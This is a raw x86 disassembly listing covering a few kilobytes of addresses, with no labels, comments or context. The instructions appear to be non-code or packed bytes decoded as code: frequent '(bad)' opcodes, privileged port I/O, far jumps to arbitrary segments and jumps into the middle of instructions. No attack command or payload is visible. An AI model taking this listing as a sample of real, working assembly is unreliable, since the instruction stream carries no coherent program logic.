  41bd0a:	or     ah,bh
  41bd0c:	nop
  41bd0d:	imul   ebx,DWORD PTR [ebx-0x1445adb8],0xf165d8fc
  41bd17:	jno    0x41bcfc
  41bd19:	and    esi,eax
  41bd1b:	fdivr  st,st(6)
  41bd1d:	xor    ebp,DWORD PTR [eax-0x3e53f0dc]
  41bd23:	in     eax,0x26
  41bd25:	cdq    
  41bd26:	fcom   DWORD PTR [eax]
  41bd28:	imul   esi,DWORD PTR [esi+edx*1-0x8694f15],0xffffffab
  41bd30:	mov    eax,ds:0xeaefc3d9
  41bd35:	test   BYTE PTR [esi-0x72],0x5f
  41bd39:	or     dh,cl
  41bd3b:	sbb    BYTE PTR ds:0x76ce42cf,0xcf
  41bd42:	mov    eax,ds:0x9a218569
  41bd47:	in     eax,dx
  41bd48:	mov    WORD PTR [ebp-0x63c54b],gs
  41bd4e:	rcr    BYTE PTR [ecx-0x109d0e26],1
  41bd54:	inc    esi
  41bd55:	call   0xc8c4:0xac08931d
  41bd5c:	inc    edx
  41bd5d:	jb     0x41bce6
  41bd5f:	fiadd  DWORD PTR [eax+0x77]
  41bd62:	mov    bl,0x67
  41bd64:	aad    0x5a
  41bd66:	push   ds
  41bd67:	or     eax,0x2267091e
  41bd6c:	sahf   
  41bd6d:	sar    DWORD PTR [edx+0x4c0e18a4],cl
  41bd73:	ficom  DWORD PTR [esi]
  41bd75:	jge    0x41bd23
  41bd77:	adc    edx,eax
  41bd79:	inc    eax
  41bd7a:	pusha  
  41bd7b:	sub    BYTE PTR [eax-0x60],0x6a
  41bd7f:	(bad)  
  41bd81:	xor    eax,0x9f15e59c
  41bd86:	push   ebp
  41bd87:	sub    al,0x97
  41bd89:	fistp  QWORD PTR [edi+0x17cef920]
  41bd8f:	xchg   ch,bh
  41bd91:	lahf   
  41bd92:	pop    ds
  41bd93:	in     al,dx
  41bd94:	mov    dh,0x90
  41bd96:	enter  0xfd4e,0x23
  41bd9a:	mov    BYTE PTR [eax],ch
  41bd9c:	pop    ecx
  41bd9d:	into   
  41bd9e:	leave  
  41bd9f:	push   0x3cfe513f
  41bda4:	(bad)  
  41bda6:	je     0x41be1e
  41bda8:	nop
  41bda9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdaa:	aad    0xfd
  41bdac:	cmp    cl,BYTE PTR [edi+0x50547fdb]
  41bdb2:	pop    esp
  41bdb3:	mov    eax,0x12937217
  41bdb8:	jle    0x41bd49
  41bdba:	sbb    BYTE PTR [ebx+0x36bd11f0],0x81
  41bdc1:	sbb    esp,DWORD PTR ds:0x53d8474a
  41bdc7:	push   ebp
  41bdc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdc9:	push   edi
  41bdca:	mov    cl,0x2
  41bdcc:	outs   dx,BYTE PTR ds:[esi]
  41bdcd:	inc    ebx
  41bdce:	jnp    0x41bddc
  41bdd0:	push   ebx
  41bdd1:	js     0x41bde3
  41bdd3:	or     dh,al
  41bdd5:	cld    
  41bdd6:	nop
  41bdd7:	sub    ebp,edi
  41bdd9:	jp     0x41be41
  41bddb:	into   
  41bddc:	sbb    DWORD PTR [edi*1+0x1454b97a],edi
  41bde3:	jp     0x41be2e
  41bde5:	rcl    al,0xcc
  41bde8:	imul   edx,DWORD PTR [esi-0x4b],0x24aead31
  41bdef:	les    esp,FWORD PTR [edx]
  41bdf1:	or     BYTE PTR [esi-0x13ca461c],dh
  41bdf7:	mov    DWORD PTR [edi],esp
  41bdf9:	cld    
  41bdfa:	pop    eax
  41bdfb:	test   al,0x2f
  41bdfd:	cmove  esi,esp
  41be00:	lea    edx,ds:[ecx]
  41be03:	xchg   edx,eax
  41be04:	sub    al,0x6c
  41be06:	cmp    al,0x1e
  41be08:	addr16 sti 
  41be0a:	js     0x41be02
  41be0c:	cs rcl esi,1
  41be0f:	dec    esi
  41be10:	in     al,0x34
  41be12:	and    al,0x53
  41be14:	lds    edx,FWORD PTR [edx*2-0x388fb35d]
  41be1b:	xchg   ebx,eax
  41be1c:	push   esi
  41be1d:	aaa    
  41be1e:	adc    BYTE PTR [esi],bl
  41be20:	ret    
  41be21:	xor    esi,DWORD PTR [edi+0x355dd0b4]
  41be27:	neg    DWORD PTR [ebx]
  41be29:	mov    edx,0x22dbfc60
  41be2e:	push   ss
  41be2f:	lods   al,BYTE PTR ds:[esi]
  41be30:	rcr    DWORD PTR [eax+0x707a596f],1
  41be36:	sbb    al,0x2b
  41be38:	push   ebx
  41be39:	ins    DWORD PTR es:[edi],dx
  41be3a:	shl    BYTE PTR [esi+edx*1-0xca7418],cl
  41be41:	mov    edx,0x422f8f0c
  41be46:	es push ss
  41be48:	push   ebp
  41be49:	lahf   
  41be4a:	sar    BYTE PTR [eax+0x6e1bda1],1
  41be50:	push   ds
  41be51:	mov    edi,0x720f2935
  41be56:	lock dec BYTE PTR [ebp-0x672832e5]
  41be5d:	pop    ss
  41be5e:	in     eax,0xe8
  41be60:	icebp  
  41be61:	test   al,0xec
  41be63:	pop    eax
  41be64:	add    eax,0x843a465a
  41be69:	push   edx
  41be6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be6b:	ja     0x41be11
  41be6d:	mov    ds:0x756cda13,al
  41be72:	xor    al,0x4c
  41be74:	cwde   
  41be75:	lods   eax,DWORD PTR ds:[esi]
  41be76:	in     eax,dx
  41be77:	out    0x71,al
  41be79:	or     edx,esp
  41be7b:	pop    ecx
  41be7c:	js     0x41beee
  41be7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be7f:	sbb    eax,0xf2da3334
  41be84:	(bad)  
  41be85:	cmp    DWORD PTR [ecx-0x26],eax
  41be88:	sbb    al,0x1b
  41be8a:	sbb    edx,ecx
  41be8c:	pop    ds
  41be8d:	or     esp,ebp
  41be8f:	and    al,0x27
  41be91:	cmp    BYTE PTR [ecx-0x5599500d],bl
  41be97:	data16 fs das 
  41be9a:	popa   
  41be9b:	fcmovne st,st(0)
  41be9d:	icebp  
  41be9e:	jp     0x41be6c
  41bea0:	mov    es:0x5917a47d,eax
  41bea6:	mov    bl,0xce
  41bea8:	dec    edx
  41bea9:	sub    DWORD PTR [edx],ebp
  41beab:	xor    ebp,0x616d253c
  41beb1:	ror    esp,1
  41beb3:	add    ebx,edx
  41beb5:	jmp    0x41be68
  41beb7:	jmp    0x8d28f7d
  41bebc:	lods   eax,DWORD PTR ds:[esi]
  41bebd:	fisubr WORD PTR [eax-0x4bdfc055]
  41bec3:	xchg   edi,eax
  41bec4:	push   eax
  41bec5:	es popf 
  41bec7:	jp     0x41bed1
  41bec9:	mov    dl,0xe6
  41becb:	sub    ebp,ecx
  41becd:	adc    BYTE PTR [eax-0x2f],bh
  41bed0:	push   ss
  41bed1:	jno    0x41bec9
  41bed3:	inc    BYTE PTR [eax+0x108d66e3]
  41bed9:	imul   ebp,DWORD PTR [ecx],0xf3b4a7c1
  41bedf:	xor    eax,0x5b
  41bee2:	add    eax,0xffffffd5
  41bee5:	push   ebx
  41bee6:	pop    eax
  41bee7:	sbb    DWORD PTR [edx-0x1c82afba],ebx
  41beed:	jns    0x41bed9
  41beef:	inc    edi
  41bef0:	(bad)  
  41bef1:	scas   al,BYTE PTR es:[edi]
  41bef2:	lea    edi,[esi-0x7d5f64bf]
  41bef8:	mov    ebp,0x1b611847
  41befd:	xor    ebp,edx
  41beff:	xor    eax,DWORD PTR [ebx-0x6cf726cc]
  41bf05:	mov    ebx,0x1a40e797
  41bf0a:	sbb    dl,BYTE PTR [ebx-0xe]
  41bf0d:	add    DWORD PTR [ecx-0x3b],0xdd9e1cb3
  41bf14:	adc    DWORD PTR [edx*1-0xf5604c1],0x2507f418
  41bf1f:	(bad)  
  41bf20:	fidiv  WORD PTR [ecx-0x340cbd9d]
  41bf26:	bound  ebx,QWORD PTR [ebp-0x28]
  41bf29:	pop    edx
  41bf2a:	out    0x7e,al
  41bf2c:	outs   dx,DWORD PTR ds:[esi]
  41bf2d:	mov    ds:0x2ffb5eda,eax
  41bf32:	add    dh,BYTE PTR [edi-0x6e]
  41bf35:	xor    DWORD PTR [edi-0x37],esi
  41bf38:	jno    0x41bf79
  41bf3a:	arpl   WORD PTR es:[edx],sp
  41bf3d:	ret    0x5db3
  41bf40:	mov    WORD PTR [eax],ss
  41bf42:	cmc    
  41bf43:	adc    eax,0x8b084142
  41bf48:	out    dx,al
  41bf49:	pop    es
  41bf4a:	sbb    ebx,DWORD PTR [ecx]
  41bf4c:	and    ecx,DWORD PTR [ecx+0x567f3e2e]
  41bf52:	popf   
  41bf53:	jl     0x41bf6f
  41bf55:	jae    0x41bf3e
  41bf57:	inc    edi
  41bf58:	sar    DWORD PTR ss:[eax+0x3d],0xd
  41bf5d:	mov    bh,0x42
  41bf5f:	shl    BYTE PTR [eax],cl
  41bf61:	cdq    
  41bf62:	pop    edx
  41bf63:	add    esi,edi
  41bf65:	das    
  41bf66:	dec    edx
  41bf67:	ins    BYTE PTR es:[edi],dx
  41bf68:	mul    DWORD PTR [esi+0x20a83509]
  41bf6e:	sub    DWORD PTR [ebp-0x54],esp
  41bf71:	lods   eax,DWORD PTR ds:[esi]
  41bf72:	mov    cl,0xbf
  41bf74:	loop   0x41bf38
  41bf76:	inc    esp
  41bf77:	(bad)  
  41bf78:	or     BYTE PTR [ecx-0x4e],cl
  41bf7b:	mov    eax,ds:0xe4611d55
  41bf80:	in     eax,0x21
  41bf82:	in     al,dx
  41bf83:	and    DWORD PTR [ebx],0x4fe497bd
  41bf89:	ins    BYTE PTR es:[edi],dx
  41bf8a:	push   ebp
  41bf8b:	xor    ebx,0x97ebff1a
  41bf91:	in     al,0x67
  41bf93:	ja     0x41bff7
  41bf95:	mov    dh,ch
  41bf97:	sub    edx,esp
  41bf99:	arpl   WORD PTR [ebx+0x21902c11],dx
  41bf9f:	and    DWORD PTR [esi+eax*8-0x4a],eax
  41bfa3:	sar    BYTE PTR [ebp-0x71daa605],cl
  41bfa9:	jmp    0x41c007
  41bfab:	jnp    0x41bfa7
  41bfad:	test   dl,ch
  41bfaf:	push   ecx
  41bfb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfb1:	xchg   ecx,eax
  41bfb2:	push   ss
  41bfb3:	sub    eax,0x6650f856
  41bfb8:	mov    esi,0x3c9207a8
  41bfbd:	fstp   TBYTE PTR [esi-0x2779100]
  41bfc3:	sti    
  41bfc4:	sbb    ecx,eax
  41bfc6:	xchg   edx,eax
  41bfc7:	mov    cl,0x12
  41bfc9:	cmp    DWORD PTR [esi-0x1a],edx
  41bfcc:	xchg   esi,eax
  41bfcd:	push   eax
  41bfce:	jmp    DWORD PTR [edi+ebp*4]
  41bfd1:	fs add eax,0x2c03077c
  41bfd7:	inc    BYTE PTR [edi-0x42]
  41bfda:	js     0x41c03c
  41bfdc:	inc    esi
  41bfdd:	jp     0x41bf76
  41bfdf:	hlt    
  41bfe0:	retf   0xd9bf
  41bfe3:	push   ebx
  41bfe4:	call   DWORD PTR [eax]
  41bfe6:	rcl    esi,1
  41bfe8:	xchg   ecx,eax
  41bfe9:	push   es
  41bfea:	or     ebx,DWORD PTR [edi-0x44]
  41bfed:	push   es
  41bfee:	mov    dl,0x74
  41bff0:	test   BYTE PTR [ebx+0x56],bl
  41bff3:	adc    eax,0xae465a21
  41bff8:	sti    
  41bff9:	fs (bad) 
  41bffb:	jg     0x41c031
  41bffd:	sti    
  41bffe:	rcl    ecx,1
  41c000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c001:	call   0x4192b957
  41c006:	jecxz  0x41bfac
  41c008:	or     al,BYTE PTR [edi+0x6e]
  41c00b:	push   es
  41c00c:	push   cs
  41c00d:	xchg   edx,eax
  41c00e:	lahf   
  41c00f:	shl    BYTE PTR ds:0x3db9a464,cl
  41c015:	xor    eax,0x15af7ecc
  41c01a:	mov    BYTE PTR [ecx+0x2a49db2d],dl
  41c020:	rcr    dh,cl
  41c022:	push   esi
  41c023:	jecxz  0x41c092
  41c025:	add    eax,0xaeb949e7
  41c02a:	aam    0xfc
  41c02c:	jecxz  0x41c07f
  41c02e:	ficomp DWORD PTR [eax-0x69]
  41c031:	cli    
  41c032:	xchg   edx,eax
  41c033:	mov    esi,0x6646a997
  41c038:	add    al,0xd8
  41c03a:	xchg   BYTE PTR [edx+0x3dd9fd47],ch
  41c040:	(bad)  
  41c041:	dec    edi
  41c042:	ret    0x189b
  41c045:	cmc    
  41c046:	push   0x4f
  41c048:	dec    ebp
  41c049:	adc    eax,0x7f1f4ca8
  41c04e:	call   0x8120ee12
  41c053:	jmp    0x6925713d
  41c058:	mov    ebx,0xbd4a9c0f
  41c05d:	push   esp
  41c05e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c05f:	cld    
  41c060:	imul   eax,DWORD PTR [edi],0xffffffcf
  41c063:	dec    esi
  41c064:	cmp    eax,esp
  41c066:	mov    ah,0xd9
  41c068:	rol    DWORD PTR [ecx],cl
  41c06a:	or     al,0x94
  41c06c:	add    al,0xa2
  41c06e:	jge    0x41c0ed
  41c070:	pop    ss
  41c071:	push   edi
  41c072:	lods   eax,DWORD PTR ds:[esi]
  41c073:	inc    edx
  41c074:	sub    eax,esi
  41c076:	scas   al,BYTE PTR es:[edi]
  41c077:	sbb    al,0xca
  41c079:	xchg   edi,eax
  41c07a:	sbb    ebx,DWORD PTR [edx+edx*8]
  41c07d:	xor    edi,esp
  41c07f:	bound  esp,QWORD PTR [eax-0x2b]
  41c082:	clc    
  41c083:	pusha  
  41c084:	into   
  41c085:	adc    eax,0xed04f38a
  41c08a:	(bad)  
  41c08b:	test   al,0x78
  41c08d:	mov    dl,0x72
  41c08f:	sub    BYTE PTR [ebx+0x69],0x4e
  41c093:	je     0x41c0e3
  41c095:	cdq    
  41c096:	enter  0x14d4,0xe4
  41c09a:	jbe    0x41c0be
  41c09c:	mov    ebp,0xd122813a
  41c0a1:	(bad)  ds:0xbba35d37
  41c0a7:	aam    0x89
  41c0a9:	out    dx,al
  41c0aa:	xchg   edx,eax
  41c0ab:	dec    ecx
  41c0ac:	repnz aam 0x69
  41c0af:	mov    eax,ds:0x1e6e5fe9
  41c0b4:	out    0x47,eax
  41c0b6:	sub    BYTE PTR [ebx-0x52dcc51b],bl
  41c0bc:	pop    ebp
  41c0bd:	sub    DWORD PTR [ebp+0x15],0xfff24962
  41c0c4:	mov    eax,0x4862c02
  41c0c9:	out    0x4e,eax
  41c0cb:	dec    edx
  41c0cc:	aad    0xb2
  41c0ce:	loopne 0x41c097
  41c0d0:	aad    0x2f
  41c0d2:	int    0xed
  41c0d4:	repz adc ch,bl
  41c0d7:	jg     0x41c141
  41c0d9:	sbb    al,0x4a
  41c0db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0dc:	mov    ebp,0x7d34f2a2
  41c0e1:	(bad)  
  41c0e2:	jno    0x41c09d
  41c0e4:	pop    edx
  41c0e5:	jo     0x41c0ca
  41c0e7:	pop    esi
  41c0e8:	stos   DWORD PTR es:[edi],eax
  41c0e9:	stos   DWORD PTR es:[edi],eax
  41c0ea:	test   DWORD PTR [esi-0x40],0x4a762aed
  41c0f1:	ror    dh,1
  41c0f3:	and    eax,0x791b2f65
  41c0f8:	fcmovne st,st(3)
  41c0fa:	push   esp
  41c0fb:	inc    ebx
  41c0fc:	retf   0xe980
  41c0ff:	sti    
  41c100:	enter  0x6d33,0xf
  41c104:	add    dl,dl
  41c106:	add    dh,ah
  41c108:	in     eax,dx
  41c109:	icebp  
  41c10a:	shl    DWORD PTR [ecx-0xf9b484],1
  41c110:	pop    edx
  41c111:	lahf   
  41c112:	mov    ch,0xee
  41c114:	test   al,bh
  41c116:	pop    edi
  41c117:	dec    ecx
  41c118:	jecxz  0x41c18e
  41c11a:	inc    edx
  41c11b:	cmp    BYTE PTR [edx+esi*8],bh
  41c11e:	stos   BYTE PTR es:[edi],al
  41c11f:	and    BYTE PTR ds:0x532a468f,0x7f
  41c126:	fadd   DWORD PTR [ebp+0x7ac85ed5]
  41c12c:	dec    ebp
  41c12d:	fisttp DWORD PTR [esi+0x43a4e5c4]
  41c133:	stos   BYTE PTR es:[edi],al
  41c134:	jg     0x41c145
  41c136:	push   ebp
  41c137:	or     BYTE PTR [eax-0x75e7394b],bl
  41c13d:	lock shl edx,cl
  41c140:	(bad)  
  41c141:	fdiv   st(3),st
  41c143:	cwde   
  41c144:	add    DWORD PTR [edx-0x23180039],esi
  41c14a:	int3   
  41c14b:	or     eax,0x839a6643
  41c150:	fsubr  DWORD PTR [ebp+0x59]
  41c153:	jl     0x41c0fd
  41c155:	(bad)  
  41c157:	fiadd  DWORD PTR [ebp+0x35]
  41c15a:	dec    dh
  41c15c:	push   cs
  41c15d:	cwde   
  41c15e:	and    eax,0x659840b3
  41c163:	cwde   
  41c164:	scas   eax,DWORD PTR es:[edi]
  41c165:	fstp   QWORD PTR ds:[ecx+0x42]
  41c169:	sbb    DWORD PTR [ecx],ecx
  41c16b:	dec    edi
  41c16c:	into   
  41c16d:	push   esi
  41c16e:	aad    0xec
  41c170:	push   ss
  41c171:	xchg   ebp,eax
  41c172:	lods   eax,DWORD PTR ds:[esi]
  41c173:	jl     0x41c10a
  41c175:	cmp    al,0x16
  41c177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c178:	imul   ebp,edi,0x8b2b9ce2
  41c17e:	es xchg ebp,eax
  41c180:	push   ecx
  41c181:	xor    DWORD PTR ds:0xabc47cdd,ebx
  41c187:	(bad)  
  41c188:	shl    BYTE PTR [ebx-0x4902d610],0x64
  41c18f:	cmp    DWORD PTR [ecx+0x7c],esi
  41c192:	push   cs
  41c193:	sbb    dl,BYTE PTR [esi+ebx*1+0x5eed12a2]
  41c19a:	test   DWORD PTR [edx],edx
  41c19c:	in     eax,dx
  41c19d:	aad    0x3b
  41c19f:	mov    ecx,0x2d39ff3d
  41c1a4:	ins    BYTE PTR es:[edi],dx
  41c1a5:	fdivp  st(4),st
  41c1a7:	xchg   edi,eax
  41c1a8:	lock inc ebp
  41c1aa:	fild   QWORD PTR [edx+0x278bd0ad]
  41c1b0:	mov    dl,0x11
  41c1b2:	xlat   BYTE PTR ds:[ebx]
  41c1b3:	es dec edx
  41c1b5:	pushf  
  41c1b6:	dec    ecx
  41c1b7:	sbb    bh,BYTE PTR [ecx]
  41c1b9:	mov    edi,0xb6f9ef18
  41c1be:	sbb    eax,0xe63596cc
  41c1c3:	jg     0x41c23e
  41c1c5:	dec    ebp
  41c1c6:	jle    0x41c16a
  41c1c8:	rcr    DWORD PTR [eax],cl
  41c1ca:	rcl    DWORD PTR [edi-0x80],0x46
  41c1ce:	loopne 0x41c1fa
  41c1d0:	pop    ecx
  41c1d1:	adc    eax,0x839019ff
  41c1d6:	clc    
  41c1d7:	add    al,0x21
  41c1d9:	loopne 0x41c160
  41c1db:	imul   edx,edi,0x658e843
  41c1e1:	adc    eax,0x4860ed43
  41c1e6:	mov    edx,0x8f67cd8b
  41c1eb:	jbe    0x41c259
  41c1ed:	lds    ecx,FWORD PTR [edx+0x4aa302ec]
  41c1f3:	jmp    0xa655:0xc7cf9075
  41c1fa:	xchg   ebp,eax
  41c1fb:	ficom  WORD PTR [eax]
  41c1fd:	dec    ebx
  41c1fe:	jo     0x41c1fc
  41c200:	xlat   BYTE PTR ds:[ebx]
  41c201:	shr    DWORD PTR [ebp+0x1379dd7f],1
  41c207:	push   ebp
  41c208:	mov    al,ds:0xeae844e0
  41c20d:	fst    st(5)
  41c20f:	push   ss
  41c210:	inc    ecx
  41c211:	jbe    0x41c263
  41c213:	mul    DWORD PTR [edx+eiz*2]
  41c216:	dec    ebp
  41c217:	mov    edx,0x225946bd
  41c21c:	mov    al,0xdb
  41c21e:	test   DWORD PTR [ecx-0x12],0x4f0f7a10
  41c225:	das    
  41c226:	leave  
  41c227:	add    eax,0xd729491e
  41c22c:	(bad)  
  41c22d:	retf   0xda92
  41c230:	clc    
  41c231:	neg    BYTE PTR [ecx]
  41c233:	pop    es
  41c234:	aaa    
  41c235:	add    al,0x55
  41c237:	ins    BYTE PTR es:[edi],dx
  41c238:	adc    ebx,DWORD PTR [eax]
  41c23a:	sar    esi,1
  41c23c:	aam    0xf7
  41c23e:	or     al,0x9d
  41c240:	and    BYTE PTR [esi],ch
  41c242:	sub    DWORD PTR [ecx+0x72],edx
  41c245:	mov    esi,0x39caafce
  41c24a:	pop    esp
  41c24b:	and    BYTE PTR [ebp+ebx*4-0x71f25c8d],dh
  41c252:	mov    eax,0xa82d635e
  41c257:	push   edi
  41c258:	jbe    0x41c25e
  41c25a:	or     eax,0x2725539c
  41c25f:	js     0x41c2d7
  41c261:	sub    eax,0xf56152d1
  41c266:	pop    ebp
  41c267:	test   eax,0x436b2565
  41c26c:	test   al,0x58
  41c26e:	pop    ebx
  41c26f:	outs   dx,DWORD PTR ds:[esi]
  41c270:	cmp    al,0xa0
  41c272:	dec    eax
  41c273:	push   eax
  41c274:	jb     0x41c22a
  41c276:	cmp    al,0x14
  41c278:	xchg   BYTE PTR [ebx-0x38],al
  41c27b:	or     al,0x6f
  41c27d:	je     0x41c2e1
  41c27f:	les    ebp,FWORD PTR [eax-0x33cb8278]
  41c285:	inc    ebx
  41c286:	in     eax,0x8c
  41c288:	dec    edx
  41c289:	repz in al,dx
  41c28b:	push   ss
  41c28c:	fstp   QWORD PTR [esi]
  41c28e:	add    BYTE PTR [ebx-0x5a42ecc1],al
  41c294:	fsub   DWORD PTR [edi]
  41c296:	data16 (bad) 
  41c298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c299:	mov    bl,0xe8
  41c29b:	mov    ds:0x7655a5f8,al
  41c2a0:	test   BYTE PTR [edx-0x60],bl
  41c2a3:	js     0x41c22b
  41c2a5:	enter  0x4cd7,0x89
  41c2a9:	or     al,0xe7
  41c2ab:	inc    ebp
  41c2ac:	push   eax
  41c2ad:	jecxz  0x41c30a
  41c2af:	jmp    0x70d566d8
  41c2b4:	lock pop edi
  41c2b6:	in     al,dx
  41c2b7:	test   al,0x7c
  41c2b9:	popf   
  41c2ba:	mov    bl,0x42
  41c2bc:	jae    0x41c24c
  41c2be:	xchg   ebx,eax
  41c2bf:	in     al,dx
  41c2c0:	add    bh,BYTE PTR [ebp+0x64]
  41c2c3:	les    edx,FWORD PTR [eax+0x5c]
  41c2c6:	mov    dl,0x20
  41c2c8:	nop
  41c2c9:	or     DWORD PTR [eax-0x3358d957],edi
  41c2cf:	jo     0x41c311
  41c2d1:	jnp    0x41c315
  41c2d3:	add    edi,DWORD PTR [eax-0x22e55509]
  41c2d9:	dec    edx
  41c2da:	cmp    DWORD PTR [ebx+0x7f5d09b7],eax
  41c2e0:	mov    esp,0x94870674
  41c2e5:	and    ecx,DWORD PTR [eax]
  41c2e7:	nop
  41c2e8:	sbb    bh,BYTE PTR [esi+0x64]
  41c2eb:	(bad)  
  41c2ec:	xor    edx,DWORD PTR [edx-0x55]
  41c2ef:	into   
  41c2f0:	inc    edi
  41c2f1:	xor    al,0x50
  41c2f3:	hlt    
  41c2f4:	jnp    0x41c2a3
  41c2f6:	lahf   
  41c2f7:	cmp    BYTE PTR [ecx+0x25],dh
  41c2fa:	cmp    eax,0x63856025
  41c2ff:	shl    BYTE PTR [eax-0x6a6f2793],1
  41c305:	xchg   ecx,eax
  41c306:	in     eax,dx
  41c307:	sub    BYTE PTR [edi-0xc],al
  41c30a:	ret    
  41c30b:	dec    edi
  41c30c:	add    ebp,DWORD PTR [eax+ebx*2]
  41c30f:	jbe    0x41c2a2
  41c311:	jo     0x41c32c
  41c313:	aas    
  41c314:	sbb    bh,BYTE PTR [edi]
  41c316:	fcomp  st(2)
  41c318:	outs   dx,DWORD PTR ds:[esi]
  41c319:	leave  
  41c31a:	add    al,0xbe
  41c31c:	jp     0x41c2f7
  41c31e:	jp     0x41c328
  41c320:	in     al,dx
  41c321:	or     cl,ah
  41c323:	mov    edi,0x7be62d8b
  41c328:	jecxz  0x41c348
  41c32a:	jg     0x41c37a
  41c32c:	(bad)  
  41c32d:	cdq    
  41c32e:	sub    ebp,DWORD PTR [esi-0x652dcd88]
  41c334:	inc    eax
  41c335:	(bad)  
  41c336:	int    0x8c
  41c338:	mov    ds,WORD PTR [edi]
  41c33a:	xor    ecx,0x64
  41c33d:	sbb    DWORD PTR [edi+ebx*1-0xe],ebp
  41c341:	sbb    cl,BYTE PTR [eax]
  41c343:	fstp   TBYTE PTR [edx-0x7d]
  41c346:	cmc    
  41c347:	in     eax,dx
  41c348:	ds mov esp,0x68e568a2
  41c34e:	adc    cl,BYTE PTR es:[esp+ebp*2+0x1daad71]
  41c356:	xchg   BYTE PTR [ecx],dl
  41c358:	adc    al,cl
  41c35a:	pop    esi
  41c35b:	mov    esi,0x59208fa9
  41c360:	shl    DWORD PTR [edx+0x527be009],cl
  41c366:	shl    DWORD PTR [eax-0x4af05cc5],cl
  41c36c:	sbb    eax,0x1c47b060
  41c371:	push   cs
  41c372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c373:	and    eax,0x66ca47fa
  41c378:	dec    edi
  41c379:	popf   
  41c37a:	mov    al,0x33
  41c37c:	mov    ?,ebp
  41c37e:	mov    esp,0x3d198744
  41c383:	jns    0x41c395
  41c385:	mov    esi,0x5d814a59
  41c38a:	enter  0x4699,0xb6
  41c38e:	mov    ah,0xd2
  41c390:	inc    edx
  41c391:	sbb    BYTE PTR [ebp-0x11],ch
  41c394:	outs   dx,BYTE PTR ds:[esi]
  41c395:	inc    ebx
  41c396:	sbb    al,0xca
  41c398:	fild   DWORD PTR [ecx]
  41c39a:	cmp    eax,0xce98524c
  41c39f:	lahf   
  41c3a0:	add    al,0xe7
  41c3a2:	xor    BYTE PTR [edx-0x3864f0e8],0xb0
  41c3a9:	imul   eax,DWORD PTR [edx+esi*4],0x40
  41c3ad:	push   ss
  41c3ae:	mov    ebx,0x5f2b0af7
  41c3b3:	sahf   
  41c3b4:	jecxz  0x41c379
  41c3b6:	mov    eax,0xa1344bfb
  41c3bb:	mov    cl,0x77
  41c3bd:	xor    ch,BYTE PTR [eax+0x74fbf937]
  41c3c3:	and    ch,al
  41c3c5:	mov    ch,0xa
  41c3c7:	rcl    ah,cl
  41c3c9:	mov    edx,?
  41c3cb:	int    0xcb
  41c3cd:	add    ch,dl
  41c3cf:	ds adc al,bl
  41c3d2:	sub    eax,0x45aa3e02
  41c3d7:	cmp    BYTE PTR [esp+eax*4-0x704427e3],ch
  41c3de:	scas   al,BYTE PTR es:[edi]
  41c3df:	jns    0x41c3d3
  41c3e1:	xor    ebx,ecx
  41c3e3:	cmp    BYTE PTR ds:0x2daad97b,ah
  41c3e9:	add    bh,ah
  41c3eb:	icebp  
  41c3ec:	mov    dl,0xe8
  41c3ee:	test   al,0x29
  41c3f0:	(bad)  
  41c3f1:	cld    
  41c3f2:	push   ss
  41c3f3:	fisttp QWORD PTR [edi]
  41c3f5:	mov    ah,0x8e
  41c3f7:	in     eax,dx
  41c3f8:	mov    esi,0xc1a25fdf
  41c3fd:	push   edi
  41c3fe:	pop    edx
  41c3ff:	mov    cl,0xbc
  41c401:	inc    esi
  41c402:	into   
  41c403:	cs scas al,BYTE PTR es:[edi]
  41c405:	mov    esi,ecx
  41c407:	fs ss out 0x4e,al
  41c40b:	and    ebp,edx
  41c40d:	push   0xbc645666
  41c412:	pop    edx
  41c413:	fistp  WORD PTR [ecx-0x4a01c45f]
  41c419:	pop    es
  41c41a:	popf   
  41c41b:	mov    ecx,0xc1622a45
  41c420:	lds    ecx,FWORD PTR [ecx]
  41c422:	pop    ebp
  41c423:	push   ss
  41c424:	mov    dh,0x1f
  41c426:	dec    esi
  41c427:	pop    ebx
  41c428:	cmc    
  41c429:	fsubr  st(7),st
  41c42b:	outs   dx,BYTE PTR ds:[esi]
  41c42c:	rcl    DWORD PTR [edi+0x61b3bfcc],1
  41c432:	popa   
  41c433:	loope  0x41c3ea
  41c435:	lods   eax,DWORD PTR ds:[esi]
  41c436:	push   ds
  41c437:	jmp    0x30e8579
  41c43c:	ds push 0xffffffb5
  41c43f:	jp     0x41c479
  41c441:	pop    ebx
  41c442:	fwait
  41c443:	ds aad 0xf2
  41c446:	loopne 0x41c417
  41c448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c449:	das    
  41c44a:	inc    esp
  41c44b:	xchg   ebx,eax
  41c44c:	imul   BYTE PTR [ecx-0x15]
  41c44f:	fs hlt 
  41c451:	sbb    eax,0x35253d8e
  41c456:	imul   ebx,ebp
  41c459:	ins    DWORD PTR es:[edi],dx
  41c45a:	push   ds
  41c45b:	(bad)  
  41c45c:	fwait
  41c45d:	popa   
  41c45e:	ror    cl,cl
  41c460:	faddp  st(0),st
  41c462:	xor    BYTE PTR [edi+0x47c37450],al
  41c468:	lods   eax,DWORD PTR ds:[esi]
  41c469:	jmp    0xafb9:0x9a9a9911
  41c470:	std    
  41c471:	je     0x41c41c
  41c473:	popa   
  41c474:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c475:	out    dx,eax
  41c476:	cdq    
  41c477:	out    dx,eax
  41c478:	mov    DWORD PTR [ebp+0x77],ebp
  41c47b:	pop    ebp
  41c47c:	inc    ecx
  41c47d:	clc    
  41c47e:	sar    DWORD PTR [edx],1
  41c480:	iret   
  41c481:	mov    al,bh
  41c483:	sbb    ah,bl
  41c485:	lds    eax,FWORD PTR [edi-0x74e3f4f6]
  41c48b:	test   DWORD PTR [ebx-0x8241ed3],edi
  41c491:	ins    BYTE PTR es:[edi],dx
  41c492:	test   ch,dl
  41c494:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
